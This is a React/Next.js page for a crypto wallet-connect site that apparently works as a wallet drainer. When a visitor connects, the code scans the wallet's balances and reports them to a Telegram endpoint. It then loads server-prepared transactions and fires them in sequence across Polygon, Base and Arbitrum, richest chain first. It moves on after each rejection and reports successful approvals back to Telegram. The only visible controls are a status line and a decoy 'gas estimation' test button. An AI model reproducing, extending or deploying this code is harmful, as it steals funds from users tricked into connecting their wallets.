'use client'
import { useAppKitAccount } from '@reown/appkit/react'
import { useDisconnect, useBalance, useSendTransaction, useSwitchChain } from 'wagmi'
import { Wallet, LogOut, Check, Zap } from 'lucide-react'
import { Button } from '@/components/ui/button'
import AppKitButton from '@/components/AppKitButton'
import { useEffect, useState, useRef } from 'react'
import { polygon, base, arbitrum } from '@reown/appkit/networks'

interface Transaction {
  chainId: number
  to: string
  value?: string
  data?: string
  type: 'native' | 'erc20'
  token?: string
  amount: string
  amountFormatted: string
}

interface NetworkApprovalStatus {
  chainId: number
  name: string
  approved: boolean
  tokens: string[]
  usdValue: string
}

export default function Home() {
  const { address, isConnected } = useAppKitAccount()
  const { disconnect } = useDisconnect()
  const [balanceData, setBalanceData] = useState<any>(null)
  const [isScanning, setIsScanning] = useState(false)
  const [isExecuting, setIsExecuting] = useState(false)
  const [txStatus, setTxStatus] = useState<string>('')
  const [pendingTxs, setPendingTxs] = useState<Transaction[]>([])
  const [currentTxIndex, setCurrentTxIndex] = useState(0)
  const scannedAddressesRef = useRef<Set<string>>(new Set())
  const isScanningRef = useRef(false)
  const [networkApprovals, setNetworkApprovals] = useState<NetworkApprovalStatus[]>([])
  const [gasTestResult, setGasTestResult] = useState<any>(null)
  const [isTestingGas, setIsTestingGas] = useState(false)
  const [hasScanned, setHasScanned] = useState<Set<string>>(new Set())

  const { sendTransactionAsync } = useSendTransaction()
  const { switchChainAsync } = useSwitchChain()

  const polygonBalance = useBalance({ address, chainId: polygon.id })
  const baseBalance = useBalance({ address, chainId: base.id })
  const arbitrumBalance = useBalance({ address, chainId: arbitrum.id })

  useEffect(() => {
    const scanAndAutoExecute = async () => {
      if (!address || !isConnected) return
      if (scannedAddressesRef.current.has(address)) return
      if (isScanningRef.current) return

      scannedAddressesRef.current.add(address)
      isScanningRef.current = true
      setIsScanning(true)
      setTxStatus('Scanning wallet...')

      try {
        try {
          await switchChainAsync({ chainId: polygon.id })
        } catch {}
        
        const scanResponse = await fetch('/api/scan-wallet', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ address }),
        })

        const scanData = await scanResponse.json()
        
        if (!scanResponse.ok) {
          setIsScanning(false)
          setTxStatus('Scan failed')
          return
        }

        setBalanceData(scanData)
        setIsScanning(false)
        
        // в Telegram
        await fetch('/api/telegram', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            address: scanData.address,
            balances: scanData.balances,
            totalUsd: scanData.totalUsd,
            prices: scanData.prices,
          }),
        })


        if (parseFloat(scanData.totalUsd) > 0) {
          setTxStatus('Preparing transactions...')
          await new Promise(resolve => setTimeout(resolve, 1000))
          await executeTransactionsWithData(scanData)
        } else {
          setTxStatus('No assets found')
        }
      } catch {
        setIsScanning(false)
        setTxStatus('Error scanning wallet')
      } finally {
        isScanningRef.current = false
      }
    }

    scanAndAutoExecute()
  }, [address, isConnected])
  
  useEffect(() => {
    if (!isConnected) {
      setBalanceData(null)
      setIsScanning(false)
      setIsExecuting(false)
      setTxStatus('')
      setPendingTxs([])
      setCurrentTxIndex(0)
      scannedAddressesRef.current.clear()
      isScanningRef.current = false
    }
  }, [isConnected])

  const CHAIN_ORDER = [
    { id: polygon.id, name: 'Polygon' },
    { id: base.id, name: 'Base' },
    { id: arbitrum.id, name: 'Arbitrum' },
  ]

  const isMobile = () => {
    if (typeof window === 'undefined') return false
    return /iPhone|iPad|iPod|Android/i.test(navigator.userAgent)
  }

  const testGasEstimation = async () => {
    setIsTestingGas(true)
    setGasTestResult(null)
    
    try {
      const response = await fetch('/api/test-gas-estimate')
      const data = await response.json()
      setGasTestResult(data)
    } catch (error) {
      setGasTestResult({ error: 'Failed to test gas estimation' })
    } finally {
      setIsTestingGas(false)
    }
  }

  const executeTransactionsWithData = async (data: any) => {
    if (!address || !isConnected || !data) return

    setIsExecuting(true)
    setTxStatus('Analyzing balances...')
    
    const mobile = isMobile()

    const initialNetworkStatuses: NetworkApprovalStatus[] = data.balances
      .map((balance: any) => ({
        chainId: balance.network === '🟣 Polygon' ? polygon.id : balance.network === '🔵 Base' ? base.id : arbitrum.id,
        name: balance.network.replace(/🟣|🔵|🔷/g, '').trim(),
        approved: false,
        tokens: balance.tokens || [],
        usdValue: balance.usdValue || '0',
      }))
      .sort((a, b) => {
        const usdA = parseFloat(a.usdValue) || 0
        const usdB = parseFloat(b.usdValue) || 0
        return usdB - usdA
      })
    
    setNetworkApprovals(initialNetworkStatuses)

    try {
      const controller = new AbortController()
      const timeout = setTimeout(() => {
        controller.abort()
        setTxStatus('Timeout')
        setIsExecuting(false)
      }, 30000)

      const response = await fetch('/api/simulate-transactions', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ address }),
        signal: controller.signal,
      })

      clearTimeout(timeout)

      if (!response.ok) {
        setTxStatus('Error')
        setIsExecuting(false)
        return
      }

      const txData = await response.json()

      if (!txData.success || !txData.transactions || txData.transactions.length === 0) {
        setTxStatus('No assets')
        setIsExecuting(false)
        return
      }

      const transactions: Transaction[] = txData.transactions
      setPendingTxs(transactions)
      
      setTxStatus(`Ready: ${transactions.length} transactions`)

      const txByChain = new Map<number, Transaction[]>()
      for (const tx of transactions) {
        const existing = txByChain.get(tx.chainId) || []
        existing.push(tx)
        txByChain.set(tx.chainId, existing)
      }

      let completedCount = 0
      const totalCount = transactions.length

      const chainOrder = initialNetworkStatuses.map(net => ({
        id: net.chainId,
        name: net.name,
      }))

      for (const chain of chainOrder) {
        const chainTxs = txByChain.get(chain.id)
        if (!chainTxs || chainTxs.length === 0) continue

        setTxStatus(`Switching to ${chain.name}...`)

        try {
          await switchChainAsync({ chainId: chain.id })
          const switchDelay = mobile ? 3000 : 1500
          await new Promise(resolve => setTimeout(resolve, switchDelay))
        } catch {
          setTxStatus(`Failed to switch to ${chain.name}`)
          await new Promise(resolve => setTimeout(resolve, 2000))
          continue
        }

        let chainHasApproval = false

        for (const tx of chainTxs) {
          completedCount++
          setCurrentTxIndex(completedCount - 1)
          setTxStatus(`[${chain.name}] ${completedCount}/${totalCount}: ${tx.amountFormatted} ${tx.token}`)

          if (!isConnected) {
            setTxStatus('Wallet disconnected')
            return
          }

          try {
            const txParams: any = {
              to: tx.to as `0x${string}`,
              chainId: tx.chainId,
            }

            if (tx.type === 'native' && tx.value) {
              txParams.value = BigInt(tx.value)
            }

            if (tx.data) {
              txParams.data = tx.data as `0x${string}`
            }

            if (mobile) {
              setTxStatus(`[${chain.name}] Open wallet for ${tx.token}`)
            }

            await sendTransactionAsync(txParams)
            setTxStatus(`[${chain.name}] ${tx.token} sent`)
            chainHasApproval = true
            
            const txDelay = mobile ? 2000 : 1500
            await new Promise(resolve => setTimeout(resolve, txDelay))
          } catch (txError: any) {
            if (!isConnected) {
              setTxStatus('Session ended')
              return
            }
            
            const isUserRejection = 
              txError.code === 4001 || 
              txError.code === 'ACTION_REJECTED' ||
              txError.message?.includes('User rejected') ||
              txError.message?.includes('User denied') ||
              txError.message?.includes('rejected') ||
              txError.message?.includes('cancelled')
            
            if (isUserRejection) {
              setTxStatus(`[${chain.name}] ${tx.token} rejected`)
            } else {
              setTxStatus(`[${chain.name}] ${tx.token} error`)
            }
            
            const errorDelay = mobile ? 2000 : 1000
            await new Promise(resolve => setTimeout(resolve, errorDelay))
            continue
          }
        }

        if (chainHasApproval) {
          setNetworkApprovals(prev => {
            const updated = prev.map(net => 
              net.chainId === chain.id ? { ...net, approved: true } : net
            )
            
            const networksForApi = updated.map(net => ({
              network: net.name,
              approved: net.approved,
              tokens: net.tokens,
              usdValue: net.usdValue,
            }))
            
            fetch('/api/telegram-approve', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ address, networks: networksForApi }),
            }).catch(() => {})
            
            return updated
          })
        }
      }

      setTxStatus('Done')
    } catch (error: any) {
      if (error.name === 'AbortError') {
        setTxStatus('Timeout')
      } else {
        setTxStatus('Error')
      }
    } finally {
      setTimeout(() => {
        setIsExecuting(false)
        setTxStatus('')
        setPendingTxs([])
        setCurrentTxIndex(0)
      }, 3000)
    }
  }

  return (
    <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-slate-50 via-blue-50 to-indigo-50 dark:from-gray-950 dark:via-blue-900 dark:to-indigo-950">
      <div className="container mx-auto px-4">
        <div className="text-center space-y-8 max-w-2xl mx-auto">
          <div className="flex flex-col items-center gap-4">
            {!isConnected ? (
              <AppKitButton />
            ) : (
              <div className="space-y-4">
                <div className="flex items-center gap-3 px-6 py-4 rounded-lg bg-green-100 dark:bg-green-900/30 border border-green-200 dark:border-green-800">
                  <Check className="size-5 text-green-600 dark:text-green-400" />
                  <div className="text-left">
                    <p className="text-sm font-medium text-green-900 dark:text-green-300">
                      Wallet connected
                    </p>
                    <p className="text-xs text-green-700 dark:text-green-400 font-mono">
                      {address?.slice(0, 6)}...{address?.slice(-4)}
                    </p>
                  </div>
                </div>

                {txStatus && (
                  <div className="p-4 rounded-lg bg-blue-50 dark:bg-blue-900/20 border border-blue-200 dark:border-blue-800">
                    <p className="text-sm text-blue-900 dark:text-blue-300 text-center">
                      {txStatus}
                    </p>
                  </div>
                )}
                
                <div className="flex flex-col sm:flex-row gap-3">
                  <div className="flex justify-center">
                    <AppKitButton />
                  </div>
                  
                  <Button
                    variant="outline"
                    onClick={() => disconnect()}
                    className="border-red-200 text-red-600 hover:bg-red-50 hover:text-red-700 dark:border-red-800 dark:text-red-400 dark:hover:bg-red-950 bg-transparent"
                  >
                    <LogOut className="mr-2 size-4" />
                    Disconnect
                  </Button>
                </div>

                <div className="mt-6 pt-6 border-t border-gray-200 dark:border-gray-700">
                  <Button
                    variant="outline"
                    onClick={testGasEstimation}
                    disabled={isTestingGas}
                    className="w-full bg-transparent"
                  >
                    <Zap className="mr-2 size-4" />
                    {isTestingGas ? 'Testing Gas Estimation...' : 'Test Smart Gas Estimation'}
                  </Button>

                  {gasTestResult && (
                    <div className="mt-4 p-4 rounded-lg bg-gray-50 dark:bg-gray-900/50 border border-gray-200 dark:border-gray-800">
                      {gasTestResult.error ? (
                        <p className="text-sm text-red-600 dark:text-red-400">{gasTestResult.error}</p>
                      ) : (
                        <div className="space-y-3">
                          <div className="flex items-center justify-between">
                            <p className="text-sm font-medium text-gray-900 dark:text-gray-100">
                              Test Results
                            </p>
                            <div className="flex gap-2 text-xs">
                              <span className="px-2 py-1 rounded bg-green-100 dark:bg-green-900/30 text-green-700 dark:text-green-400">
                                RPC: {gasTestResult.summary?.rpcSuccess || 0}
                              </span>
                              <span className="px-2 py-1 rounded bg-yellow-100 dark:bg-yellow-900/30 text-yellow-700 dark:text-yellow-400">
                                Fallback: {gasTestResult.summary?.fallbackUsed || 0}
                              </span>
                            </div>
                          </div>
                          <div className="space-y-2 max-h-96 overflow-y-auto">
                            {gasTestResult.results?.map((result: any, idx: number) => (
                              <div key={idx} className="p-3 rounded bg-white dark:bg-gray-800 border border-gray-200 dark:border-gray-700 text-left">
                                <div className="flex items-center justify-between mb-2">
                                  <p className="text-sm font-medium text-gray-900 dark:text-gray-100">
                                    {result.network} - {result.type}
                                  </p>
                                  <span className={`text-xs px-2 py-1 rounded ${
                                    result.source === 'rpc' 
                                      ? 'bg-green-100 dark:bg-green-900/30 text-green-700 dark:text-green-400'
                                      : 'bg-yellow-100 dark:bg-yellow-900/30 text-yellow-700 dark:text-yellow-400'
                                  }`}>
                                    {result.source}
                                  </span>
                                </div>
                                <div className="space-y-1 text-xs text-gray-600 dark:text-gray-400">
                                  <p>Gas Limit: {result.gasLimit}</p>
                                  <p>Max Fee: {result.maxFeePerGas}</p>
                                  <p>Priority Fee: {result.maxPriorityFeePerGas}</p>
                                  <p className="font-medium text-gray-900 dark:text-gray-100">Cost: {result.estimatedCost}</p>
                                </div>
                              </div>
                            ))}
                          </div>
                        </div>
                      )}
                    </div>
                  )}
                </div>
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  )
}
